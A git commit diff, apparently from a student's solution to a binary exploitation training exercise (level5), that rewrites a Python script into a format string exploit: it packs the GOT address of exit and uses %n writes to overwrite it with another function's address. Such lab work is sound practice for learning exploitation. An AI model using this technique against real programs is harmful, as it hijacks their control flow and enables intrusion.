24c874bdc6caffc887a888d2d9d7ea581e2c9883
mrxx0 <chcoutur@student.42.fr>
2022-01-13 18:45:07 +0100

    Clean level4 and 5

--- level5/tmp.py
+++ level5/tmp.py
@@ -1,3 +1,5 @@
+import struct
+
 FT_O =			0x80484a4
 EXIT_GOT=		0x8049838
 
@@ -5,6 +7,13 @@ def pad(s):
     return s+"X"*(512-len(s))
 
 exploit=""
-exploit+= "%x " * 4
+exploit+= struct.pack("I", EXIT_GOT)
+exploit+= struct.pack("I", EXIT_GOT + 2)
+exploit+="BBBBCCCC"
 
+exploit+= "%4$33940x"
+exploit+= "%4$n"
+
+exploit+= "%33632x"
+exploit+= "%5$n"
 print pad(exploit)
